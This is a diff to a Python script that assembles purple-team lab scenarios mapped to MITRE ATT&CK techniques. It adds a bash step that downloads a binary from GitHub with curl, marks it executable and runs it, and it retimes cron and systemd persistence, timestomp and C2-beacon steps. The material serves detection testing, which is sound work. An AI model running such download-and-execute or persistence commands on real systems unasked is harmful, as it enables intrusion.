@@ -82,6 +82,31 @@ def make_inject(key, title, desc, label, executor, content,
 
 injects = []
 
+# 0. Ingress tool transfer (T1105) — pull the wld tool-under-test onto the host (FIRST)
+injects.append(make_inject("ingress",
+ "Ingress Tool Transfer — pull the wld tool onto the host (T1105)",
+ "First step of the chain: fetch the tool-under-test. curl downloads the wld binary from the "
+ "project's GitHub and runs `wld -h` (benign — prints usage) to prove download+execute, then "
+ "cleanup removes it. Detection: curl writing an executable to disk and a new process spawning "
+ "from it (proxy/NDR tool transfer; EDR exec-after-download).",
+ "Ingress tool transfer (wld)", "bash",
+ "# WETLAND-LAB  T1105 ingress tool transfer — pull the wld tool-under-test\n"
+ "url='https://raw.githubusercontent.com/s4nntysec/wetland/main/dist/release/wld-linux-x86_64'\n"
+ "# (swap to a Release once published: .../releases/latest/download/wld-linux-x86_64)\n"
+ "dst=\"$HOME/.wetland-lab-wld\"\n"
+ "if curl -fsSL -o \"$dst\" \"$url\"; then\n"
+ "  chmod +x \"$dst\"\n"
+ "  echo \"WETLAND-LAB ingress: downloaded wld -> $dst (T1105)\"\n"
+ "  \"$dst\" -h 2>&1 | head -n 2\n"
+ "else\n"
+ "  echo 'WETLAND-LAB ingress: download blocked (proxy/AV) — that is a valid detection'\n"
+ "fi\n"
+ "echo 'detect: curl writing an executable to disk then executing it; proxy/NDR tool transfer'\n",
+ "bash",
+ "rm -f \"$HOME/.wetland-lab-wld\"\n"
+ "echo 'WETLAND-LAB ingress: cleaned'\n",
+ [ap("T1105","Ingress Tool Transfer")], 0))
+
 injects.append(make_inject("masquerade",
  "Masquerade — process named as a kernel thread (T1036)",
  "Purple-team sim of `wld -l -M '[kworker/0:0]'` / `wld lab masquerade`: launches a real "
@@ -99,7 +124,7 @@ injects.append(make_inject("masquerade",
  "rm -f /tmp/.wetland-lab-kworker\n"
  "echo 'WETLAND-LAB masquerade: cleaned'\n",
  [ap("T1036.005","Match Legitimate Name or Location"),
-  ap("T1036.004","Masquerade Task or Service")], 0))
+  ap("T1036.004","Masquerade Task or Service")], 60))
 
 injects.append(make_inject("persist_cron",
  "Persistence — @reboot cron entry (T1053.003)",
@@ -115,7 +140,7 @@ injects.append(make_inject("persist_cron",
  "sh",
  "crontab -l 2>/dev/null | grep -v 'WETLAND-LAB' | crontab - 2>/dev/null || true\n"
  "echo 'WETLAND-LAB persist[cron]: cleaned'\n",
- [ap("T1053.003","Cron")], 60))
+ [ap("T1053.003","Cron")], 120))
 
 injects.append(make_inject("persist_systemd",
  "Persistence — systemd --user service (T1543.002)",
@@ -144,7 +169,7 @@ injects.append(make_inject("persist_systemd",
  "rm -f \"$HOME/.config/systemd/user/wetland-lab.service\"\n"
  "systemctl --user daemon-reload 2>/dev/null || true\n"
  "echo 'WETLAND-LAB persist[systemd]: cleaned'\n",
- [ap("T1543.002","Systemd Service")], 120))
+ [ap("T1543.002","Systemd Service")], 180))
 
 injects.append(make_inject("hide",
  "Defense Evasion — hidden file + timestomp (T1564.001 / T1070.006)",
@@ -162,7 +187,7 @@ injects.append(make_inject("hide",
  "rm -f \"$HOME/.wetland-lab\"\n"
  "echo 'WETLAND-LAB hide: cleaned'\n",
  [ap("T1564.001","Hidden Files and Directories"),
-  ap("T1070.006","Timestomp")], 180))
+  ap("T1070.006","Timestomp")], 240))
 
 injects.append(make_inject("beacon",
  "Command & Control — HTTP-shaped C2 beacon (T1071.001 / T1571)",
@@ -187,7 +212,7 @@ injects.append(make_inject("beacon",
  "echo 'detect: periodic outbound to one host; fixed UA; low bytes-up/down (NetFlow/Zeek)'\n",
  None, None,
  [ap("T1071.001","Web Protocols"),
-  ap("T1571","Non-Standard Port")], 240))
+  ap("T1571","Non-Standard Port")], 300))
 
 # ---- envelope: keep the real export's shape, swap info + injects, empty instance data ----
 out = copy.deepcopy(base)
